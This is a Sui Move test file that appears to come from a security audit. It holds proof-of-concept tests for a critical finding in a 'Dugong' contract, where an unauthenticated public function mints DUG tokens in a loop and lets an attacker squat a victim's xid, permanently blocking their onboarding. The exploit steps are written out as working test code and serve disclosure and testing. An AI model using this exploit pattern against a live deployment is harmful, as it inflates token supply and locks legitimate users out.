// Copyright (c) Dugong
// SPDX-License-Identifier: Apache-2.0
//
// PoC for Finding 4954 (Critical) — Unauthenticated infinite DUG mint +
// XID-squatting DoS.
//
// `dugong::account::init_account_no_signature(registry, xid, handle, ctx)` is
// `public` and performs NO authentication (no signature, no Cap, no sender
// check). It calls `create_account`, which:
//   1. mints `STARTER_DUG_BALANCE` of DUG against the `TreasuryCap<DUG>` held
//      inside the SHARED `DugongRegistry` via `dug::grant_starter_dug`
//      (`core.move:367-378`), and credits it to the new account;
//   2. permanently reserves `xid` in the shared `xid_to_account` table
//      (`core.move:264-266`), so the legitimate owner can never claim it.
//
// Any PTB can therefore loop `init_account_no_signature` with a fresh xid to
// mint arbitrary DUG (inflation), or pre-register victims' xids to permanently
// DoS onboarding.
//
// We cannot read `TreasuryCap.total_supply` from outside `sui::coin`, so we
// instead sum the per-account DUG balances minted by the attacker — the minted
// value is recoverable and the per-account sum equals the supply delta.

#[test_only]
module dugong::audit_poc_tests {
    use sui::test_scenario::{Self as ts};
    use dugong::dug::{Self, DUG, DugongAccount, DugongRegistry};
    use dugong::account;
    use dugong::assets;

    fun attacker(): address { @0xE }
    fun victim(): address { @0xB }
    fun deployer(): address { @0xCAFE }

    // Build a per-iteration distinct xid.
    fun xid_for(i: u64): vector<u8> {
        let mut out = b"attacker-xid-";
        // append one byte whose value uniquely identifies i (works for i < 256)
        out.push_back((i as u8) + 0x30);
        out
    }

    // ====== PoC #2a: unauthenticated attacker mints DUG in a loop ======

    #[test]
    fun test_poc_4954_infinite_dug_mint_unauthenticated() {
        let mut scenario = ts::begin(deployer());

        // Project init: shares the DugongRegistry with the TreasuryCap<DUG>.
        ts::next_tx(&mut scenario, deployer());
        { dug::init_for_testing(ts::ctx(&mut scenario)); };

        // Attacker — a completely unrelated address — invokes
        // init_account_no_signature 5 times in a single PTB, each with a fresh
        // xid. No signature, no enclave, no Cap, no auth of any kind.
        ts::next_tx(&mut scenario, attacker());
        {
            let mut registry = ts::take_shared<DugongRegistry>(&scenario);
            let mut i = 0;
            while (i < 5) {
                account::init_account_no_signature(
                    &mut registry,
                    xid_for(i),
                    b"h",
                    ts::ctx(&mut scenario),
                );
                i = i + 1;
            };
            ts::return_shared(registry);
        };

        // Each attacker-created account holds exactly STARTER_DUG_BALANCE of
        // DUG. Summing them gives 5 * STARTER_DUG_BALANCE — proving an
        // unbounded, unauthenticated DUG mint.
        let mut total_minted = 0;
        ts::next_tx(&mut scenario, attacker());
        {
            let registry = ts::take_shared<DugongRegistry>(&scenario);
            let mut i = 0;
            while (i < 5) {
                let xid = std::string::utf8(xid_for(i));
                let account_id = dug::registry_get_account_id(&registry, xid);
                let account = ts::take_shared_by_id<DugongAccount>(&scenario, account_id);
                let bal = assets::get_balance<DUG>(&account);
                assert!(bal == dug::starter_dug_balance(), 0xCC);
                total_minted = total_minted + bal;
                ts::return_shared(account);
                i = i + 1;
            };
            ts::return_shared(registry);
        };
        assert!(total_minted == 5 * dug::starter_dug_balance(), 0xBB);

        ts::end(scenario);
    }

    // ====== PoC #2b: attacker squats a victim's xid → permanent DoS ======

    #[test]
    #[expected_failure(abort_code = 0, location = dugong::account)] // EXidAlreadyExists (0)
    fun test_poc_4954_xid_squatting_dos() {
        let mut scenario = ts::begin(deployer());

        ts::next_tx(&mut scenario, deployer());
        { dug::init_for_testing(ts::ctx(&mut scenario)); };

        // Attacker front-runs onboarding and pre-registers the victim's xid.
        ts::next_tx(&mut scenario, attacker());
        {
            let mut registry = ts::take_shared<DugongRegistry>(&scenario);
            account::init_account_no_signature(
                &mut registry,
                b"victim-real-twitter-id",
                b"impersonating-handle",
                ts::ctx(&mut scenario),
            );
            ts::return_shared(registry);
        };

        // The legitimate victim can NEVER create their account — the xid is
        // permanently reserved in the shared table, even via the legitimate
        // `init_account` flow with a valid enclave signature. The dedup check
        // at create_account runs before any auth path, so any caller hits
        // EXidAlreadyExists on the squatted xid.
        ts::next_tx(&mut scenario, victim());
        {
            let mut registry = ts::take_shared<DugongRegistry>(&scenario);
            account::init_account_no_signature(
                &mut registry,
                b"victim-real-twitter-id", // same xid
                b"victim-handle",
                ts::ctx(&mut scenario),
            );
            ts::return_shared(registry);
        };

        ts::end(scenario);
    }

    // ====== PoC #2c: any single call to init_account_no_signature ======
    // ======       mints STARTER_DUG_BALANCE with zero authentication ======

    #[test]
    fun test_poc_4954_single_call_mints_starter_dug() {
        let mut scenario = ts::begin(deployer());

        ts::next_tx(&mut scenario, deployer());
        { dug::init_for_testing(ts::ctx(&mut scenario)); };

        // Single unauthenticated call by a random address.
        ts::next_tx(&mut scenario, attacker());
        {
            let mut registry = ts::take_shared<DugongRegistry>(&scenario);
            account::init_account_no_signature(
                &mut registry,
                b"single-xid",
                b"h",
                ts::ctx(&mut scenario),
            );
            ts::return_shared(registry);
        };

        // The attacker-recoverable supply equals exactly STARTER_DUG_BALANCE.
        ts::next_tx(&mut scenario, attacker());
        {
            let registry = ts::take_shared<DugongRegistry>(&scenario);
            let account_id = dug::registry_get_account_id(&registry, std::string::utf8(b"single-xid"));
            let account = ts::take_shared_by_id<DugongAccount>(&scenario, account_id);
            assert!(assets::get_balance<DUG>(&account) == dug::starter_dug_balance(), 0xDD);
            ts::return_shared(account);
            ts::return_shared(registry);
        };

        ts::end(scenario);
    }
}
